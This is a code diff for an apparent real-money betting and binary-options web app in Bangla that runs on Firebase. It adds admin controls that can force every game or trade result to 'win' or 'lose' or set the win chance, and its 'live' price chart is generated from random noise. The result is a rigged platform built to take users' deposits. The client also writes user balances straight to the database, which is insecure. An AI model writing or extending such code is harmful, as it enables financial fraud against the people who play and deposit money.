@@ -16,13 +16,23 @@ const db = firebase.firestore();
 let currentUser = null;
 let userData = null;
 
+// Admin Controlled Game Settings (Default values)
+let gameSettings = { chance: 45, mode: 'none' };
+
+// Listen to Admin Game Controller in Realtime
+db.collection("settings").doc("game_config").onSnapshot(doc => {
+    if(doc.exists) {
+        gameSettings = doc.data();
+    }
+});
+
 // ====== Custom UI Popup (Toast) ======
 function showPopup(msg, type = 'error') {
     const container = document.getElementById('toast-container');
     const toast = document.createElement('div');
     const color = type === 'error' ? 'bg-red-500' : (type === 'success' ? 'bg-green-500' : 'bg-blue-500');
     
-    toast.className = `${color} text-white px-4 py-3 rounded-xl shadow-2xl font-bold text-sm flex justify-between items-center toast-enter pointer-events-auto border border-white/20`;
+    toast.className = `${color} text-white px-4 py-3 rounded-xl shadow-2xl font-bold text-sm flex justify-between items-center toast-enter pointer-events-auto border border-white/20 mt-2`;
     toast.innerHTML = `<span>${msg}</span> <button onclick="this.parentElement.remove()"><i class="fa-solid fa-xmark"></i></button>`;
     
     container.prepend(toast);
@@ -122,7 +132,20 @@ function playGenericGame() {
     document.getElementById('game-result-display').innerHTML = '<i class="fa-solid fa-spinner fa-spin text-blue-500"></i>';
     
     setTimeout(() => {
-        const isWin = Math.random() < 0.45; // 45% win chance
+        // === Admin Controlled Win/Loss Logic ===
+        let isWin = false;
+        
+        if (gameSettings.mode === 'win') {
+            isWin = true; // Admin forced WIN
+        } else if (gameSettings.mode === 'lose') {
+            isWin = false; // Admin forced LOSE
+        } else {
+            // Normal Probability Mode
+            const chanceToWin = gameSettings.chance / 100;
+            isWin = Math.random() < chanceToWin; 
+        }
+
+        // Provide Result
         if(isWin) {
             const winAmt = bet * 2;
             db.collection("users").doc(currentUser.uid).update({ balance: newBal + winAmt });
@@ -156,9 +179,8 @@ function initTrading() {
         upColor: '#22c55e', downColor: '#ef4444', borderVisible: false, wickUpColor: '#22c55e', wickDownColor: '#ef4444'
     });
 
-    // Generate initial dummy history
     const history = [];
-    let time = Math.floor(Date.now() / 1000) - 3600; // 1 hour ago
+    let time = Math.floor(Date.now() / 1000) - 3600;
     let lastClose = 65000;
     for(let i=0; i<60; i++) {
         const open = lastClose;
@@ -171,7 +193,6 @@ function initTrading() {
     currentPrice = lastClose;
     currentCandle = { time: Math.floor(Date.now()/1000), open: currentPrice, high: currentPrice, low: currentPrice, close: currentPrice };
 
-    // Real-time Tick Update (Every 500ms)
     setInterval(() => {
         const volatility = (Math.random() * 20) - 10;
         currentPrice += volatility;
@@ -182,15 +203,13 @@ function initTrading() {
         
         candleSeries.update(currentCandle);
         document.getElementById('live-price').innerText = currentPrice.toFixed(2);
-        document.getElementById('live-price').className = volatility >= 0 ? "text-3xl font-mono text-green-400 bg-slate-900 py-2 rounded-xl" : "text-3xl font-mono text-red-400 bg-slate-900 py-2 rounded-xl";
+        document.getElementById('live-price').className = volatility >= 0 ? "text-3xl font-mono text-green-400 bg-slate-900 py-2 rounded-xl border border-slate-700" : "text-3xl font-mono text-red-400 bg-slate-900 py-2 rounded-xl border border-slate-700";
 
-        // Create new candle every 10 seconds
         if(Math.floor(Date.now()/1000) % 10 === 0) {
             currentCandle = { time: Math.floor(Date.now()/1000), open: currentPrice, high: currentPrice, low: currentPrice, close: currentPrice };
         }
     }, 500);
 
-    // Responsive chart
     new ResizeObserver(entries => {
         if(entries.length === 0 || entries[0].target !== container) return;
         tvChart.applyOptions({ width: container.clientWidth, height: container.clientHeight });
@@ -208,32 +227,37 @@ function placeTrade(direction) {
     if(amt < 100) return showPopup("সর্বনিম্ন ট্রেড ১০০ টাকা!");
     if(amt > userData.balance) return showPopup("ব্যালেন্স অপর্যাপ্ত!");
 
-    // Deduct
     const newBal = userData.balance - amt;
     db.collection("users").doc(currentUser.uid).update({ balance: newBal });
     showPopup(`ট্রেড প্লেস হয়েছে: ${direction}`, "success");
 
     const startPrice = currentPrice;
     const box = document.createElement('div');
-    box.className = `p-2 rounded border-l-4 ${direction==='CALL'?'border-green-500':'border-red-500'} bg-slate-800`;
+    box.className = `p-2 mb-2 rounded border-l-4 ${direction==='CALL'?'border-green-500':'border-red-500'} bg-slate-800`;
     box.innerHTML = `${direction} - ৳${amt} | Wait 30s...`;
     document.getElementById('active-trades').prepend(box);
 
     setTimeout(() => {
         const endPrice = currentPrice;
         let won = false;
-        if(direction === 'CALL' && endPrice > startPrice) won = true;
-        if(direction === 'PUT' && endPrice < startPrice) won = true;
+        
+        // Trading Also Listens to Admin Game Controls
+        if (gameSettings.mode === 'win') won = true;
+        else if (gameSettings.mode === 'lose') won = false;
+        else {
+            if(direction === 'CALL' && endPrice > startPrice) won = true;
+            if(direction === 'PUT' && endPrice < startPrice) won = true;
+        }
 
         if(won) {
-            const winAmt = amt * 1.8; // 80% profit
+            const winAmt = amt * 1.8;
             db.collection("users").doc(currentUser.uid).update({ balance: newBal + winAmt });
             box.innerHTML = `${direction} - <span class="text-green-400 font-bold">WIN +৳${winAmt.toFixed(2)}</span>`;
             showPopup(`ট্রেড WIN! +৳${winAmt.toFixed(2)}`, "success");
         } else {
             box.innerHTML = `${direction} - <span class="text-red-400 font-bold">LOST</span>`;
         }
-    }, 30000); // 30 seconds
+    }, 30000);
 }
 
 // ====== Wallet Request ======
@@ -254,7 +278,6 @@ function reqWithdraw() {
     if(!amt || amt < 100) return showPopup("সর্বনিম্ন উইথড্র ১০০ টাকা");
     if(amt > userData.balance) return showPopup("ব্যালেন্স নাই!");
 
-    // Deduct immediately
     db.collection("users").doc(currentUser.uid).update({ balance: userData.balance - amt });
     
     db.collection("requests").add({
